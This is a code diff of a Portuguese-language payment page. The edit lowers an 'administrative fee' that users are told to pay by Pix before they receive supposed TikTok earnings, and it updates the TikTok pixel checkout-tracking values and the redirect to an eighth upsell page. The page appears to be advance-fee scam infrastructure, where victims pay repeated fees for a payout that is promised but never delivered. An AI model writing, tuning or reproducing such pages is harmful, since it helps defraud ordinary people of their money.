@@ -16,7 +16,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     p = Object.assign({}, p || {});
     var cid = String(p.content_id || (p.contents && p.contents[0] && p.contents[0].content_id) || 'taxa_confirmacao_tiktok').trim() || 'taxa_confirmacao_tiktok';
     var cname = String(p.content_name || (p.contents && p.contents[0] && p.contents[0].content_name) || 'Taxa de Confirmacao TikTok').trim() || 'Taxa de Confirmacao TikTok';
-    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 13.92);
+    var val = (typeof p.value === 'number' && p.value > 0) ? p.value : (parseFloat(p.value) > 0 ? parseFloat(p.value) : 36.50);
     p.content_id = cid; p.content_ids = [cid]; p.content_type = 'product'; p.content_name = cname; p.value = val; p.currency = p.currency || 'BRL';
     p.contents = [{ content_id: cid, content_type: 'product', content_name: cname, quantity: 1, price: val }];
     return p;
@@ -89,7 +89,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                     </p>
 
                     <p>
-                        Após o pagamento da taxa administrativa no valor de <strong class="text-black text-lg">R$ 38,94</strong>, referente ao valor do seu ganho, você receberá o saldo correspondente de forma imediata em sua conta bancária via Pix.
+                        Após o pagamento da taxa administrativa no valor de <strong class="text-black text-lg">R$ 17,98</strong>, referente ao valor do seu ganho, você receberá o saldo correspondente de forma imediata em sua conta bancária via Pix.
                     </p>
                     
                     <div class="bg-yellow-50 p-6 border-l-4 border-yellow-500">
@@ -107,7 +107,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
                     </div>
                     <div class="flex justify-between items-center border-t border-gray-200 pt-6 mt-6">
                         <span class="text-md font-black text-gray-800 uppercase tracking-tighter">Total a pagar:</span>
-                        <span class="text-6x2 font-black text-black tracking-tighter">R$ 38,94</span>
+                        <span class="text-6x2 font-black text-black tracking-tighter">R$ 17,98</span>
                     </div>
                 </div>
 
@@ -145,7 +145,7 @@ var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n
     <script src="/checkout/qrcode.min.js"></script>
 <script src="/checkout/up-checkout.js"></script>
 <script>
-function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_8_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', contents: [{ content_id: 'upsell_8_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', quantity: 1, price: 38.94 }], value: 38.94, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:38.94,titulo:"Taxa Administrativa",proximoUrl:"../up8/index.html"});}
+function irParaCheckout(event){event.preventDefault();if(typeof ttq !== 'undefined' && typeof ttq.track === 'function'){try { ttq.track('InitiateCheckout', { content_id: 'upsell_8_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', contents: [{ content_id: 'upsell_8_tiktok', content_type: 'product', content_name: 'Taxa Administrativa', quantity: 1, price: 17.98 }], value: 17.98, currency: 'BRL' }); } catch(e){}}window.abrirCheckoutPix({valor:17.98,titulo:"Taxa Administrativa",proximoUrl:"../up8/index.html"});}
 </script>
 <script src="../assets/tracking.js"></script>
 <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"3d04d58e8080411197bd269faa9f7da8","r":1,"spa":2}' crossorigin="anonymous"></script>
